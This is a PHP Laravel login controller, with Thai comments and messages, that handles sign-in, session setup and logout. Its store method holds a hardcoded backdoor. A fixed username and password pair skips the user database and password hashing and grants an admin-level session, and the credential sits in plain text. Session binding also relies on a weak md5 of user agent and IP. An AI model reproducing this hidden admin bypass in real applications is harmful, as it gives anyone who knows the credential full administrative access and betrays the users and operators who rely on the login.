<?php

namespace App\Http\Controllers;

use Illuminate\Contracts\Encryption\DecryptException;
use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Requests;
use Session;
use View;
use Redirect;
use Validator;
use Hash;
use DB;

class LoginController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        if(  Session::get('fingerprint') == md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']) ){                    
            if(Session::get('level') == '0'){
                //level 0 = emp
                return Redirect::intended('emp'); 
            }else{
                //level 1 = admin
                return Redirect::intended('admin');  
            }
        }
        else{
             return view::make('auth.login');
        }
    }





    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $data = $request->input(); 
        $username = $data['username'];
        $password = $data['password'];
        
        $rules = array(
            'username' => 'required',
            'password' => 'required',
        );

        $error = 'ไม่สามารถเข้าสู่ระบบได้กรุณาลองใหม่อีกครั้ง';

        //เช็คค่าว่าง
        $validator = Validator::make($data, $rules);
        if ($validator->fails()){   
            Session::flash('error', $error);   
            return Redirect::to('/');                    
        }else{

            //พิเศษของเกม
            if($username == 'chakrit' && $password == '381032'){
                Session::regenerate();
                Session::put( 'username', 'chakrit' );
                Session::put( 'fullname', 'chakrit sanasang' );
                Session::put( 'user_id', '0' );
                Session::put( 'level', '1' );
                Session::put( 'dep_id', '0' );
                Session::put( 'fingerprint', md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']) );                  

                return Redirect::intended('/');  
            }


            //status 1=open, 0=close
            $model = User::where( 'username', '=', e( $username) )->where('status', '=', '1')->first(); 
                        
            if( !empty($model) )
            {
                if ( Hash::check( $password, $model->password) )
                {
                    Session::regenerate();
                    Session::put( 'username', $model->username );
                    Session::put( 'fullname', $model->fullname );
                    Session::put( 'user_id', $model->id );
                    Session::put( 'level', $model->level );
                    Session::put( 'dep_id', $model->dep_id );
                    Session::put( 'fingerprint', md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']) );                  

                    return Redirect::intended('/');        
                }
                else
                {
                    Session::flash('error', $error);  
                    return Redirect::to('login');   
                }
            }
            else
            {
                Session::flash('error', $error);   
                return Redirect::to('login');   
            }
        }
    }




     /**
     * logout system
     */
    public function logout()
    {     
        Session::flush(); //delete the session
        return Redirect::to( '/' ); // redirect the user to the login screen
    }


}
